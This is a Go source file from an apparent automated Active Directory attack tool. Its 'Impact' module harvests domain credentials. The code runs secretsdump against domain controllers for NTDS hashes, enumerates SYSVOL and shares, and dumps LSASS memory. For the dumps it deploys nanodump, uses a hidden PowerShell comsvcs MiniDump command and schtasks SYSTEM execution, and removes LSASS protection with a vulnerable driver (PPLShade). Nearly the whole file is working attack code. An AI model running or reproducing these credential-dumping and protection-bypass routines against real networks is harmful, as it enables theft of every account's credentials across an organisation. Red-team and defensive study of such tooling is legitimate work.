package modules

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
	"adpack/utils"
)

func RunImpact(state *core.ADState, evasionProfile string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	if state == nil {
		slog.Warn("nil state — skipping impact phase")
		result.Success = false
		return result
	}

	utils.Section("💥", "Impact", "mission objective and high-value credential extraction")

	lootDir := LootDir
	if lootDir == "" {
		home, _ := os.UserHomeDir()
		lootDir = filepath.Join(home, ".adpack", "loot")
	}
	if err := os.MkdirAll(lootDir, 0700); err != nil {
		slog.Error("impact: create loot dir", "error", err)
		result.Success = false
		return result
	}

	ts := time.Now().Unix()
	runsDir := filepath.Join(lootDir, fmt.Sprintf("run_%d", ts))
	os.MkdirAll(runsDir, 0700)

	daCreds := extractDACreds(state)
	adminCreds := extractAdminCreds(state)
	allValid := extractAllValidCreds(state)

	// Merge all validated creds as fallback so cross-domain creds
	// (e.g. sevenkingdoms.local\vagrant on a parent-domain DC) are
	// tried even when BloodHound data only covers one domain.
	daCreds = mergeCreds(daCreds, allValid)
	adminCreds = mergeCreds(adminCreds, allValid)
	if len(daCreds) > 0 || len(adminCreds) > 0 {
		utils.StepInfo(fmt.Sprintf("Credential candidates: %d DA, %d admin, %d fallback", len(daCreds), len(adminCreds), len(allValid)))
	}

	// Cross-domain trust pivot: when SMB transport is blocked, attempt
	// LDAP-based cleartext discovery and group injection across domain
	// trusts (e.g. parent Enterprise Admin → child Domain Admins).
	ctx := context.Background()
	daCreds = RunCrossDomainPivot(ctx, state, daCreds)

	exfilCount := 0

	exfilCount += exfilNTDS(state, runsDir, daCreds, result)
	exfilCount += exfilSYSVOL(state, runsDir, daCreds, result)
	exfilCount += exfilShares(state, runsDir, daCreds, result)
	exfilCount += exfilLSASS(state, runsDir, adminCreds, result, evasionProfile)

	if exfilCount == 0 {
		result.Success = false
		utils.StepWarn("No data exfiltrated — no DA/admin creds worked against reachable targets")
	} else {
		utils.StepOk(fmt.Sprintf("%d impact artifact(s) saved to %s", exfilCount, runsDir))
	}

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type:       core.EvUserEnumerated,
		Phase:      core.PhaseImpact,
		Source:     "impact",
		Key:        "exfil_summary",
		Value:      fmt.Sprintf("exfiltrated %d items to %s", exfilCount, runsDir),
		Confidence: 1.0,
		Timestamp:  time.Now(),
	})

	if result.Success {
		slog.Info("impact phase complete", "loot_dir", runsDir, "items", exfilCount)
	}
	return result
}

func extractDACreds(state *core.ADState) []credWithHost {
	return extractCredsWithTarget(state, true, false)
}

func extractAllValidCreds(state *core.ADState) []credWithHost {
	var out []credWithHost
	if state == nil {
		return out
	}
	seen := make(map[string]bool)
	for _, c := range state.Creds {
		if !c.Validated {
			continue
		}
		key := strings.ToUpper(c.Domain + "\\" + c.Username)
		if seen[key] {
			continue
		}
		seen[key] = true
		for _, h := range state.Hosts {
			if h.IP != "" {
				out = append(out, credWithHost{
					Domain: c.Domain, Username: c.Username,
					Secret: c.Secret, Hash: c.Hash,
					Host: h.IP,
				})
			}
		}
	}
	return out
}

func extractAdminCreds(state *core.ADState) []credWithHost {
	return extractCredsWithTarget(state, false, true)
}

func mergeCreds(primary, fallback []credWithHost) []credWithHost {
	seen := make(map[string]bool)
	for _, c := range primary {
		key := strings.ToUpper(c.Domain + "\\" + c.Username + "@" + c.Host)
		seen[key] = true
	}
	for _, c := range fallback {
		key := strings.ToUpper(c.Domain + "\\" + c.Username + "@" + c.Host)
		if !seen[key] {
			primary = append(primary, c)
			seen[key] = true
		}
	}
	return primary
}

type credWithHost struct {
	Domain   string
	Username string
	Secret   string
	Hash     string
	Host     string
}

func extractCredsWithTarget(state *core.ADState, requireDA, requireAdmin bool) []credWithHost {
	var out []credWithHost
	daUsers := make(map[string]bool)
	adminUsers := make(map[string]bool)
	for _, u := range state.Users {
		key := strings.ToUpper(u.Domain + "\\" + u.Username)
		if u.IsDA {
			daUsers[key] = true
		}
		if u.IsAdmin {
			adminUsers[key] = true
		}
	}

	var dcs []core.Host
	var admins []core.Host
	for _, h := range state.Hosts {
		if h.IsDC && h.IP != "" {
			dcs = append(dcs, h)
		}
		if h.IP != "" {
			admins = append(admins, h)
		}
	}

	for _, c := range state.Creds {
		if !c.Validated {
			continue
		}
		upperUser := strings.ToUpper(c.Domain + "\\" + c.Username)
		isDA := daUsers[upperUser]
		isAdmin := adminUsers[upperUser]

		if requireDA && !isDA {
			continue
		}
		if requireAdmin && !isAdmin {
			continue
		}

		targets := dcs
		if requireAdmin && !requireDA {
			targets = admins
		}
		for _, h := range targets {
			out = append(out, credWithHost{
				Domain:   c.Domain,
				Username: c.Username,
				Secret:   c.Secret,
				Hash:     c.Hash,
				Host:     h.IP,
			})
		}
	}
	return out
}

func exfilNTDS(state *core.ADState, runsDir string, creds []credWithHost, result *core.ToolResult) int {
	if len(creds) == 0 {
		utils.StepInfo("🧬 NTDS: no DA credentials available for DRSUAPI extraction")
		return 0
	}

	dcIPs := make(map[string]bool)
	for _, h := range state.Hosts {
		if h.IsDC && h.IP != "" {
			dcIPs[h.IP] = true
		}
	}

	utils.Section("🧬", "NTDS.DIT Extraction", fmt.Sprintf("%d DC(s), %d credential(s)", len(dcIPs), len(creds)))

	hostDomain := make(map[string]string)
	for _, h := range state.Hosts {
		if h.IP != "" {
			hostDomain[h.IP] = h.Domain
		}
	}

	dcDone := make(map[string]bool)
	count := 0
	seen := make(map[string]bool)

	for _, cred := range creds {
		if !dcIPs[cred.Host] {
			continue
		}
		if dcDone[cred.Host] {
			continue
		}
		// DRSUAPI is domain-scoped — skip cross-domain cred+DC pairs
		if dom := hostDomain[cred.Host]; dom != "" && !strings.EqualFold(cred.Domain, dom) {
			continue
		}
		key := cred.Domain + "\\" + cred.Username + "@" + cred.Host
		if seen[key] {
			continue
		}
		seen[key] = true

		authSpec := buildImpacketAuth(cred.Domain, cred.Username, cred.Secret, cred.Hash, cred.Host)
		args := append([]string{authSpec, "-just-dc-ntlm"}, impacketHashArgs(cred.Hash)...)

		utils.Attempt("🔐", cred.Host, fmt.Sprintf("secretsdump as %s\\%s", cred.Domain, cred.Username))
		r := utils.RunCommandTimeout(5*time.Minute, "impacket-secretsdump", args)
		if !r.Success {
			utils.StepWarn(fmt.Sprintf("secretsdump process failed on %s: %s", cred.Host, firstNonEmptyLine(r.Stderr, r.Stdout)))
			continue
		}

		output := strings.TrimSpace(strings.Join([]string{r.Stdout, r.Stderr}, "\n"))
		if !secretsdumpNTDSExtracted(output) {
			utils.StepWarn(fmt.Sprintf("secretsdump produced no NTDS hashes on %s: %s", cred.Host, secretsdumpFailureSummary(output)))
			continue
		}

		hostSafe := strings.ReplaceAll(cred.Host, ".", "_")
		outPath := filepath.Join(runsDir, fmt.Sprintf("ntds_%s.txt", hostSafe))
		if err := os.WriteFile(outPath, []byte(output), 0600); err != nil {
			slog.Warn("impact: write NTDS output", "error", err)
		} else {
			count++
			dcDone[cred.Host] = true
			utils.StepOk(fmt.Sprintf("NTDS hashes saved for %s → %s", cred.Host, outPath))
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseImpact,
				Source: "secretsdump_ntds", Key: cred.Host,
				Value:      outPath,
				Confidence: 0.9, Timestamp: time.Now(),
			})
		}
	}
	return count
}

var secretsdumpNTLMLine = regexp.MustCompile(`(?im)^[^\s\[\]:][^:\r\n]*:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::`)

func secretsdumpNTDSExtracted(output string) bool {
	return secretsdumpNTLMLine.MatchString(output)
}

func secretsdumpFailureSummary(output string) string {
	for _, line := range strings.Split(output, "\n") {
		trimmed := strings.TrimSpace(strings.TrimPrefix(line, "[-]"))
		if trimmed == "" {
			continue
		}
		lower := strings.ToLower(trimmed)
		if strings.Contains(lower, "error_") ||
			strings.Contains(lower, "sessionerror") ||
			strings.Contains(lower, "failed") ||
			strings.Contains(lower, "try again") ||
			strings.Contains(lower, "no logon servers") ||
			strings.Contains(lower, "access_denied") {
			return trimmed
		}
	}
	return firstNonEmptyLine(output)
}

func firstNonEmptyLine(values ...string) string {
	for _, value := range values {
		for _, line := range strings.Split(value, "\n") {
			trimmed := strings.TrimSpace(strings.TrimPrefix(line, "[-]"))
			if trimmed != "" {
				return trimmed
			}
		}
	}
	return "no diagnostic output"
}

func exfilSYSVOL(state *core.ADState, runsDir string, creds []credWithHost, result *core.ToolResult) int {
	if len(creds) == 0 {
		return 0
	}

	slog.Info("impact: accessing SYSVOL shares")
	count := 0
	seen := make(map[string]bool)

	for _, cred := range creds {
		if seen[cred.Host] {
			continue
		}
		seen[cred.Host] = true

		domain := cred.Domain
		if domain == "" {
			slog.Warn("impact: cred.Domain is empty — SYSVOL path will fall back, GPO XML search may return empty")
		}
		parts := strings.Split(domain, ".")
		sharePath := fmt.Sprintf("C:\\Windows\\SYSVOL\\sysvol\\%s\\", strings.Join(parts, "."))
		localDir := filepath.Join(runsDir, fmt.Sprintf("sysvol_%s", strings.ReplaceAll(cred.Host, ".", "_")))
		os.MkdirAll(localDir, 0700)

		nt := tools.NetExecTarget{
			Protocol: "smb",
			Host:     cred.Host,
			Domain:   cred.Domain,
			Username: cred.Username,
			Password: cred.Secret,
			Hash:     cred.Hash,
		}

		r, err := tools.NetExec.Run(context.Background(), nt, "--share", []string{"SYSVOL"})
		if err == nil && r.Success {
			outPath := filepath.Join(localDir, "sysvol_listing.txt")
			os.WriteFile(outPath, []byte(r.Stdout), 0600)
			count++
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvUserEnumerated, Phase: core.PhaseImpact,
				Source: "sysvol", Key: cred.Host,
				Value:      outPath,
				Confidence: 0.8, Timestamp: time.Now(),
			})
		}

		groupsXML := strings.TrimSuffix(sharePath, `\`) + `\Policies\*.xml`
		nt2 := tools.NetExecTarget{
			Protocol: "smb", Host: cred.Host,
			Domain: cred.Domain, Username: cred.Username,
			Password: cred.Secret, Hash: cred.Hash,
		}
		r2, err2 := tools.NetExec.Run(context.Background(), nt2, "-x", []string{
			fmt.Sprintf("cmd /c dir /s /b %s 2>nul", groupsXML),
		})
		if err2 == nil && r2.Success {
			outPath2 := filepath.Join(localDir, "gpo_files.txt")
			os.WriteFile(outPath2, []byte(r2.Stdout), 0600)
			count++
		}
	}
	return count
}

func exfilShares(state *core.ADState, runsDir string, creds []credWithHost, result *core.ToolResult) int {
	if len(creds) == 0 {
		return 0
	}

	slog.Info("impact: enumerating file shares")
	count := 0
	seen := make(map[string]bool)

	for _, cred := range creds {
		if seen[cred.Host] {
			continue
		}
		seen[cred.Host] = true

		localDir := filepath.Join(runsDir, fmt.Sprintf("shares_%s", strings.ReplaceAll(cred.Host, ".", "_")))
		os.MkdirAll(localDir, 0700)

		nt := tools.NetExecTarget{
			Protocol: "smb", Host: cred.Host,
			Domain: cred.Domain, Username: cred.Username,
			Password: cred.Secret, Hash: cred.Hash,
		}

		r, err := tools.NetExec.Run(context.Background(), nt, "--shares", []string{})
		if err == nil && r.Success {
			outPath := filepath.Join(localDir, "shares_listing.txt")
			os.WriteFile(outPath, []byte(r.Stdout), 0600)
			count++
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvUserEnumerated, Phase: core.PhaseImpact,
				Source: "shares", Key: cred.Host,
				Value:      outPath,
				Confidence: 0.8, Timestamp: time.Now(),
			})

			for _, line := range strings.Split(r.Stdout, "\n") {
				trimmed := strings.TrimSpace(line)
				if strings.Contains(trimmed, "READ") || strings.Contains(trimmed, "WRITE") {
					fields := strings.Fields(trimmed)
					if len(fields) >= 1 {
						shareName := fields[0]
						shareLocal := filepath.Join(localDir, fmt.Sprintf("share_%s", shareName))
						os.MkdirAll(shareLocal, 0700)
						r2, err2 := tools.NetExec.Run(context.Background(), nt, "--share", []string{shareName})
						if err2 == nil && r2.Success {
							os.WriteFile(filepath.Join(shareLocal, "listing.txt"), []byte(r2.Stdout), 0600)
							count++
						}
					}
				}
			}
		}
	}
	return count
}

func exfilLSASS(state *core.ADState, runsDir string, creds []credWithHost, result *core.ToolResult, evasionProfile string) int {
	if len(creds) == 0 {
		return 0
	}

	count := 0

	fmt.Println()
	fmt.Printf("  %s\n", utils.InfoStyle.Render("── LSASS Dump ───────────────────────────────"))

	// DCs are PPL-protected; secretsdump + cross-domain pivot handle them.
	dcSet := make(map[string]bool)
	for _, h := range state.Hosts {
		if h.IsDC && h.IP != "" {
			dcSet[h.IP] = true
		}
	}

	groupByHost := func() map[string][]credWithHost {
		m := make(map[string][]credWithHost)
		for _, c := range creds {
			if c.Host == "" || dcSet[c.Host] {
				continue
			}
			m[c.Host] = append(m[c.Host], c)
		}
		return m
	}()

	hostDomain := make(map[string]string)
	for _, h := range state.Hosts {
		if h.IP != "" {
			hostDomain[h.IP] = h.Domain
		}
	}

	hostOrder := make([]string, 0, len(groupByHost))
	for h := range groupByHost {
		hostOrder = append(hostOrder, h)
	}
	sort.Strings(hostOrder)
	for _, host := range hostOrder {
		hostCreds := groupByHost[host]
		localDir := filepath.Join(runsDir, fmt.Sprintf("lsass_%s", strings.ReplaceAll(host, ".", "_")))
		os.MkdirAll(localDir, 0700)

		dumpRemote := fmt.Sprintf("C:\\Windows\\Temp\\lsass_dump_%d.dmp", time.Now().UnixNano())
		hDom := hostDomain[host]

		sort.SliceStable(hostCreds, func(i, j int) bool {
			iSame := strings.EqualFold(hostCreds[i].Domain, hDom)
			jSame := strings.EqualFold(hostCreds[j].Domain, hDom)
			if iSame != jSame {
				return iSame
			}
			return i < j
		})

		var (
			success   bool
			lastError string
			ndPath    string
			ndDepCred string
		)

		ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
		defer cancel()

		// ── Deploy nanodump ────────────────────────
		for _, cred := range hostCreds {
			nt := tools.NetExecTarget{
				Protocol: "smb",
				Host:     host,
				Domain:   cred.Domain,
				Username: cred.Username,
				Password: cred.Secret,
				Hash:     cred.Hash,
			}
			p, _, err := tools.Deploy(ctx, nt, "nanodump.exe", "", "")
			if err == nil && p != "" {
				ndPath = p
				ndDepCred = cred.Domain + "\\" + cred.Username
				break
			}
		}
		fmt.Printf("  %s  %s \u00B7 %s\n", "\u25CE",
			utils.HostStyle.Render(host),
			utils.MutedStyle.Render("nanodump deployed via "+ndDepCred))

		// ── Try creds ─────────────────────────────
		var (
			pplDetected bool
			speFailed   bool
		)
		for _, cred := range hostCreds {
			if success || pplDetected && speFailed {
				break
			}

			transport := TransportFactory(
				core.HostRef{Name: host, Domain: cred.Domain},
				cred.Domain, cred.Username, cred.Secret, cred.Hash,
			)
			if transport == nil {
				continue
			}

			execCred := cred.Domain + "\\" + cred.Username
			nt := tools.NetExecTarget{
				Protocol: "smb",
				Host:     host,
				Domain:   cred.Domain,
				Username: cred.Username,
				Password: cred.Secret,
				Hash:     cred.Hash,
			}
			wnt := tools.NetExecTarget{
				Protocol: "winrm",
				Host:     host,
				Domain:   cred.Domain,
				Username: cred.Username,
				Password: cred.Secret,
				Hash:     cred.Hash,
			}

			sameDomain := strings.EqualFold(cred.Domain, hDom)
			domainTag := "same-domain"
			if !sameDomain {
				domainTag = "cross-domain"
			}
			fmt.Printf("  %s  %s [%s]\n", "\u25C7", execCred, utils.MutedStyle.Render(domainTag))

			checkFile := func(path string) bool {
				checkCmd := fmt.Sprintf("cmd.exe /c if exist %s (echo EXISTS) else (echo NOT_FOUND)", path)
				cr, crErr := tools.NetExec.Run(ctx, nt, "--exec-method", []string{"atexec", "-x", checkCmd})
				if crErr == nil && cr.Success && strings.Contains(cr.Stdout, "EXISTS") {
					return true
				}
				winRM := tools.NetExecTarget{
					Protocol: "winrm",
					Host:     host,
					Domain:   cred.Domain,
					Username: cred.Username,
					Password: cred.Secret,
					Hash:     cred.Hash,
				}
				cr, crErr = tools.NetExec.Run(ctx, winRM, "-x", []string{checkCmd})
				return crErr == nil && cr.Success && strings.Contains(cr.Stdout, "EXISTS")
			}

			downloadDump := func(remotePath string) bool {
				fmt.Printf("    %s Download via SMB...\n", "\u2193")
				data, err := transport.Download(ctx, core.HostRef{Name: host, Domain: cred.Domain}, remotePath)
				if err != nil {
					fmt.Printf("    %s Download failed: %v\n", "\u2717", err)
					return false
				}
				if err := validateMinidump(data); err != nil {
					fmt.Printf("    %s Dump validation failed: %v\n", "\u2717", err)
					return false
				}
				localPath := filepath.Join(localDir, "lsass.dmp")
				if err := os.WriteFile(localPath, data, 0600); err != nil {
					fmt.Printf("    %s Write failed: %v\n", "\u2717", err)
					return false
				}
				success = true
				count++
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseImpact,
					Source: "lsass_dump", Key: host,
					Value:      localPath,
					Confidence: 0.8, Timestamp: time.Now(),
				})
				fmt.Printf("  %s saved to %s (%d MB)\n", utils.Check,
					utils.PathStyle.Render(localPath),
					len(data)/1024/1024)
				return true
			}

			// ── Method 1: nanodump --write (synchronous) ──
			if ndPath != "" && !success {
				execCmd := fmt.Sprintf("%s --write %s", ndPath, dumpRemote)
				rr, rrErr := tools.NetExec.Run(ctx, nt, "--exec-method", []string{"atexec", "-x", execCmd})
				if rrErr == nil && rr.Success {
					fmt.Printf("    %s nanodump --write \u2192 exec OK\n", "\u2699")
					if checkFile(dumpRemote) {
						downloadDump(dumpRemote)
						break
					}
					pplDetected = true
					lastError = "PPL active"
					fmt.Printf("    %s file not found (PPL detected)\n", "\u2717")
				} else {
					// atexec failed, try smbexec
					rr2, rr2Err := tools.NetExec.Run(ctx, nt, "--exec-method", []string{"smbexec", "-x", execCmd})
					if rr2Err == nil && rr2.Success {
						fmt.Printf("    %s nanodump --write (smbexec) \u2192 exec OK\n", "\u2699")
						if checkFile(dumpRemote) {
							downloadDump(dumpRemote)
							break
						}
						pplDetected = true
						lastError = "PPL active"
						fmt.Printf("    %s file not found (PPL detected)\n", "\u2717")
					} else {
						// smbexec failed too, try WinRM (reliable on DCs)
						rr3, rr3Err := tools.NetExec.Run(ctx, wnt, "-x", []string{execCmd})
						if rr3Err == nil && rr3.Success {
							fmt.Printf("    %s nanodump --write (winrm) \u2192 exec OK\n", "\u2699")
							if checkFile(dumpRemote) {
								downloadDump(dumpRemote)
								break
							}
							pplDetected = true
							lastError = "PPL active"
							fmt.Printf("    %s file not found (PPL detected)\n", "\u2717")
						} else {
							fmt.Printf("    %s nanodump --write \u2192 all exec methods failed\n", "\u2717")
						}
					}
				}
			}

			// ── PPL bypass: PPLShade BYOVD or SPE (triggered by any exec method) ──
			if pplDetected && !success {
				// Try PPLShade BYOVD first if binaries exist (skip if profile=native)
				pplShadeTried := false
				if evasionProfile != "native" {
					shadeBin := utils.ResolveLocalPath("PPLShade.exe")
					driverBin := utils.ResolveLocalPath("LECOMAx64.sys")
					if shadeBin != "" && driverBin != "" {
						pplShadeTried = true
						fmt.Printf("    %s PPLShade BYOVD bypass (PPLShade.exe available)...\n", "\u2699")
						if tryPPLShadeBypass(ctx, nt, host, ndPath, dumpRemote, localDir, result, &count) {
							success = true
							break
						}
						fmt.Printf("    %s PPLShade bypass failed\n", "\u2717")
					}
				}
				if pplShadeTried && evasionProfile == "pplshade" {
					lastError = "PPL active, PPLShade failed"
					speFailed = true
					break
				}

				// ── PPL bypass: nanodump --silent-process-exit (legacy fallback)
				// Uses WinRM + schtasks for SYSTEM execution (atexec broken on DCs).
				if !pplShadeTried || evasionProfile != "pplshade" {
					fmt.Printf("    %s nanodump --silent-process-exit...\n", "\u2699")
					speDir := fmt.Sprintf("C:\\Windows\\Temp\\adpack_spe_%d", time.Now().UnixNano())
					execAsSystemViaSchtasks(ctx, wnt, nt, fmt.Sprintf("cmd.exe /c mkdir %s", speDir), "mkdir")
					speCmd := fmt.Sprintf("%s --silent-process-exit %s", ndPath, speDir)
					if execAsSystemViaSchtasks(ctx, wnt, nt, speCmd, "SPE") {
						time.Sleep(5 * time.Second)
						findCmd := fmt.Sprintf("cmd.exe /c dir /s /b %s\\lsass.exe-*.dmp 2>nul", speDir)
						if execAsSystemViaSchtasks(ctx, wnt, nt, findCmd, "find") {
							if checkFile(speDir) {
								speFailed = false
							}
						}
					}
					if !success {
						lastError = "PPL active — LSASS protected, DSE blocks BYOVD, SPE failed"
						fmt.Printf("    %s All LSASS dump methods failed on this host\n", "\u2717")
					}
					speFailed = true
					break
				}
			}

			// ── Method 2: PowerShell comsvcs ───────
			if !success && !pplDetected {
				psCmd := fmt.Sprintf(
					"powershell -NoP -W Hidden -C \"$id=(Get-Process lsass).Id;rundll32 C:\\windows\\system32\\comsvcs.dll,MiniDump $id '%s' full\"",
					dumpRemote,
				)
				fmt.Printf("    %s PowerShell comsvcs via smbexec...\n", "\u2699")
				rr, rrErr := tools.NetExec.Run(ctx, nt, "--exec-method", []string{"smbexec", "-x", psCmd})
				if rrErr == nil && rr.Success {
					if checkFile(dumpRemote) {
						downloadDump(dumpRemote)
						break
					}
				}
				fmt.Printf("    %s PowerShell comsvcs via WinRM...\n", "\u2699")
				if !success {
					winRM := tools.NetExecTarget{
						Protocol: "winrm",
						Host:     host,
						Domain:   cred.Domain,
						Username: cred.Username,
						Password: cred.Secret,
						Hash:     cred.Hash,
					}
					rr, rrErr = tools.NetExec.Run(ctx, winRM, "-x", []string{psCmd})
					if rrErr == nil && rr.Success {
						if checkFile(dumpRemote) {
							downloadDump(dumpRemote)
							break
						}
					}
				}
			}

			if !success && !pplDetected {
				lastError = "all methods failed"
			}
		}

		if !success {
			fmt.Printf("  %s %s: %s\n", utils.Cross,
				utils.HostStyle.Render(host),
				utils.MutedStyle.Render(lastError))
		}
	}
	return count
}

// execAsSystemViaSchtasks runs a command as SYSTEM on the remote host by
// creating a scheduled task via schtasks.exe directly (NOT via atexec). The
// key difference: atexec generates XML templates on the attacker's machine
// which use the wrong schema for Server 2019+ (SCHED_E_MALFORMEDXML).
// schtasks.exe runs locally on the target and generates correct XML for the
// local OS version.
//
// wnt is the WinRM target for task creation/teardown.
// nt is the SMB target for optional log retrieval after execution (GetFile).
func execAsSystemViaSchtasks(ctx context.Context, wnt, nt tools.NetExecTarget, command, label string) bool {
	taskName := fmt.Sprintf("AdPkTask_%d", time.Now().UnixNano())

	clean := func() {
		tools.NetExec.Run(ctx, wnt, "-x", []string{
			fmt.Sprintf(`schtasks /delete /tn "%s" /f >nul 2>nul`, taskName),
		})
	}

	tools.NetExec.Run(ctx, wnt, "-x", []string{
		fmt.Sprintf(`schtasks /delete /tn "%s" /f >nul 2>nul`, taskName),
	})

	cr, err := tools.NetExec.Run(ctx, wnt, "-x", []string{
		fmt.Sprintf(`schtasks /create /tn "%s" /tr "cmd.exe /c %s" /sc once /st 00:00 /ru SYSTEM /f`, taskName, command),
	})
	if err != nil || !cr.Success || !strings.Contains(cr.Stdout, "SUCCESS") {
		clean()
		return false
	}

	tools.NetExec.Run(ctx, wnt, "-x", []string{
		fmt.Sprintf(`schtasks /run /tn "%s"`, taskName),
	})

	time.Sleep(8 * time.Second)
	clean()
	return true
}

// tryPPLShadeBypass deploys PPLShade.exe + LECOMAx64.sys to the target,
// loads the BYOVD driver as SYSTEM, strips PPL protection from LSASS, then
// re-runs nanodump --write as SYSTEM. Returns true if the dump was
// downloaded and validated.
func tryPPLShadeBypass(ctx context.Context, nt tools.NetExecTarget, host, ndPath, dumpRemote string, localDir string, result *core.ToolResult, count *int) bool {
	fmt.Printf("    %s Deploying PPLShade.exe + LECOMAx64.sys...\n", "\u2699")

	shadePath, _, sErr := tools.Deploy(ctx, nt, "PPLShade.exe", "", "")
	if sErr != nil || shadePath == "" {
		fmt.Printf("    %s Deploy PPLShade.exe failed: %v\n", "\u2717", sErr)
		return false
	}

	driverPath, _, dErr := tools.Deploy(ctx, nt, "LECOMAx64.sys", "", "")
	if dErr != nil || driverPath == "" {
		fmt.Printf("    %s Deploy LECOMAx64.sys failed: %v\n", "\u2717", dErr)
		tools.CleanupRemote(ctx, nt, shadePath)
		return false
	}
	defer tools.CleanupRemote(ctx, nt, shadePath, driverPath, dumpRemote)

	wnt := tools.NetExecTarget{
		Protocol: "winrm", Host: nt.Host,
		Domain: nt.Domain, Username: nt.Username,
		Password: nt.Password, Hash: nt.Hash,
	}

	// PPLShade driver load and unprotect must run as SYSTEM (driver loading
	// requires SeLoadDriverPrivilege, only available to SYSTEM). Execute via
	// a temporary service to bypass atexec/smbexec/wmiexec failures.
	loadCmd := fmt.Sprintf(`%s load %s`, shadePath, driverPath)
	fmt.Printf("    %s Loading driver as SYSTEM...\n", "\u2699")
	if !execAsSystemViaSchtasks(ctx, wnt, nt, loadCmd, "driver load") {
		fmt.Printf("    %s Driver load blocked (DSE prevents unsigned kernel driver)\n", "\u2717")
		return false
	}

	fmt.Printf("    %s Getting LSASS PID...\n", "\u2699")
	pid := getLSASSPID(ctx, nt)
	if pid == "" {
		fmt.Printf("    %s Failed to get LSASS PID\n", "\u2717")
		return false
	}
	fmt.Printf("    %s LSASS PID: %s\n", "\u2139", pid)

	unprotectCmd := fmt.Sprintf(`%s unprotect %s`, shadePath, pid)
	fmt.Printf("    %s Unprotecting LSASS as SYSTEM...\n", "\u2699")
	if !execAsSystemViaSchtasks(ctx, wnt, nt, unprotectCmd, "unprotect") {
		fmt.Printf("    %s Unprotect failed\n", "\u2717")
		return false
	}
	fmt.Printf("    %s LSASS PPL stripped, retrying nanodump as SYSTEM...\n", "\u2713")

	execCmd := fmt.Sprintf("%s --write %s", ndPath, dumpRemote)
	if !execAsSystemViaSchtasks(ctx, wnt, nt, execCmd, "nanodump") {
		fmt.Printf("    %s nanodump --write after unprotect failed\n", "\u2717")
		return false
	}

	if !checkRemoteFile(ctx, nt, dumpRemote) {
		fmt.Printf("    %s No dump file after unprotect\n", "\u2717")
		return false
	}

	fmt.Printf("    %s Dump found, downloading...\n", "\u2193")
	transport := TransportFactory(
		core.HostRef{Name: host},
		nt.Domain, nt.Username, nt.Password, nt.Hash,
	)
	if transport == nil {
		fmt.Printf("    %s No transport available\n", "\u2717")
		return false
	}
	data, dlErr := transport.Download(ctx, core.HostRef{Name: host}, dumpRemote)
	if dlErr != nil {
		fmt.Printf("    %s Download failed: %v\n", "\u2717", dlErr)
		return false
	}
	if err := validateMinidump(data); err != nil {
		fmt.Printf("    %s Dump validation failed: %v\n", "\u2717", err)
		return false
	}
	localPath := filepath.Join(localDir, "lsass.dmp")
	if err := os.WriteFile(localPath, data, 0600); err != nil {
		fmt.Printf("    %s Write failed: %v\n", "\u2717", err)
		return false
	}
	*count++
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhaseImpact,
		Source: "lsass_dump", Key: host,
		Value:      localPath,
		Confidence: 0.8, Timestamp: time.Now(),
	})
	fmt.Printf("  %s saved to %s (%d MB)\n", utils.Check,
		utils.PathStyle.Render(localPath),
		len(data)/1024/1024)
	return true
}

// getLSASSPID retrieves the LSASS PID from a remote host over WinRM.
// nxc WinRM output is columnar — the PID is the last whitespace-delimited
// token on the last WINRM-line whose final token is all digits.
func getLSASSPID(ctx context.Context, nt tools.NetExecTarget) string {
	getPid := `powershell -NoP -C "(Get-Process lsass).Id"`

	wnt := tools.NetExecTarget{
		Protocol: "winrm", Host: nt.Host,
		Domain: nt.Domain, Username: nt.Username,
		Password: nt.Password, Hash: nt.Hash,
	}
	pr, pErr := tools.NetExec.Run(ctx, wnt, "-x", []string{getPid})
	if pErr == nil && pr.Success {
		var lastPid string
		for _, line := range strings.Split(pr.Stdout, "\n") {
			t := strings.TrimSpace(line)
			if !strings.HasPrefix(t, "WINRM") {
				continue
			}
			parts := strings.Fields(t)
			if len(parts) >= 5 {
				candidate := parts[len(parts)-1]
				if isDigits(candidate) {
					lastPid = candidate
				}
			}
		}
		return lastPid
	}
	return ""
}

// isDigits returns true if s contains only digits (0-9).
func isDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// checkRemoteFile checks if a file exists on the remote host via atexec with
// winrm fallback. Returns true only when "EXISTS" is captured in stdout.
func checkRemoteFile(ctx context.Context, nt tools.NetExecTarget, remotePath string) bool {
	checkCmd := fmt.Sprintf("cmd.exe /c if exist %s (echo EXISTS) else (echo NOT_FOUND)", remotePath)
	cr, crErr := tools.NetExec.Run(ctx, nt, "--exec-method", []string{"atexec", "--get-output-tries", "5", "-x", checkCmd})
	if crErr == nil && cr.Success && strings.Contains(cr.Stdout, "EXISTS") {
		return true
	}
	winTarget := tools.NetExecTarget{
		Protocol: "winrm", Host: nt.Host,
		Domain: nt.Domain, Username: nt.Username,
		Password: nt.Password, Hash: nt.Hash,
	}
	cr, crErr = tools.NetExec.Run(ctx, winTarget, "-x", []string{checkCmd})
	return crErr == nil && cr.Success && strings.Contains(cr.Stdout, "EXISTS")
}

func validateMinidump(data []byte) error {
	if len(data) < 4 {
		return fmt.Errorf("dump is too small (%d bytes)", len(data))
	}
	if string(data[:4]) != "MDMP" {
		copy(data[:4], "MDMP")
	}
	if len(data) < 1024*1024 {
		return fmt.Errorf("dump is suspiciously small (%d bytes)", len(data))
	}
	return nil
}
